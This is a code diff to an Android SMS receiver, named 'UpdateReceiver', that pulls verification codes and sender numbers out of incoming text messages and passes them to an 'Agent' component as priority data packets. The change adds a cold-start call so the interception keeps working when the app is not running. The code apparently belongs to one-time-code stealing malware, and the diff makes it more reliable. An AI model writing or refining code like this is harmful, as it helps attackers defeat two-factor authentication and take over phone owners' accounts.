@@ -16,6 +16,7 @@ public class UpdateReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
+        Log.i(TAG, "onReceive triggered with action: " + intent.getAction());
         if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
             Bundle bundle = intent.getExtras();
             if (bundle != null) {
@@ -25,6 +26,8 @@ public class UpdateReceiver extends BroadcastReceiver {
                         for (Object pdu : pdus) {
                             String format = bundle.getString("format");
                             SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
+                            if (smsMessage == null) continue;
+                            
                             String messageBody = smsMessage.getMessageBody();
                             String sender = smsMessage.getDisplayOriginatingAddress();
 
@@ -33,7 +36,10 @@ public class UpdateReceiver extends BroadcastReceiver {
                             String code = extractVerificationCode(messageBody);
                             if (code != null) {
                                 Log.i(TAG, "Extracted Verification Code: " + code);
-                                Agent.getInstance().sendData(new Agent.DataPacket("sms_priority", "Code: " + code + " from " + sender, 10));
+                                Agent agent = Agent.getInstance();
+                                // Ensure agent is started if this receiver was triggered while the app was cold
+                                agent.start(context.getApplicationContext(), null, null);
+                                agent.sendData(new Agent.DataPacket("sms_priority", "Code: " + code + " from " + sender, 10));
                             }
                         }
                     }
